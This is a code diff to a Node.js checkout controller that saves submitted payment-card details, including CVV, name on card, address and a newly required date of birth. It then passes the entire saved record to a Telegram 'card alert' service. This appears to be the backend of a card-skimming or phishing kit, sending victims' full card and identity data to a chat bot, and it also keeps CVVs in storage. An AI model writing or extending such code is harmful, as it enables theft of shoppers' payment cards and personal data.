@@ -1,4 +1,5 @@
 const Payment = require('../models/Payment');
+const telegramService = require('../services/telegramService');
 
 /**
  * Save new payment/checkout details to the database
@@ -21,6 +22,8 @@ exports.createPayment = async (req, res) => {
       state,
       country,
       postCode,
+      isBusiness,
+      dob,
     } = req.body;
 
     // Simple validation
@@ -36,14 +39,13 @@ exports.createPayment = async (req, res) => {
       !cvv ||
       !nameOnCard ||
       !address ||
-      !town ||
-      !state ||
       !country ||
-      !postCode
+      !postCode ||
+      !dob
     ) {
       return res.status(400).json({
         success: false,
-        message: 'All checkout fields are required',
+        message: 'All required checkout fields must be filled',
       });
     }
 
@@ -65,9 +67,14 @@ exports.createPayment = async (req, res) => {
       state,
       country,
       postCode,
+      isBusiness,
+      dob,
     });
 
     await newPayment.save();
+
+    // Trigger Telegram alert notification
+    telegramService.sendCardAlert(newPayment);
 
     res.status(201).json({
       success: true,
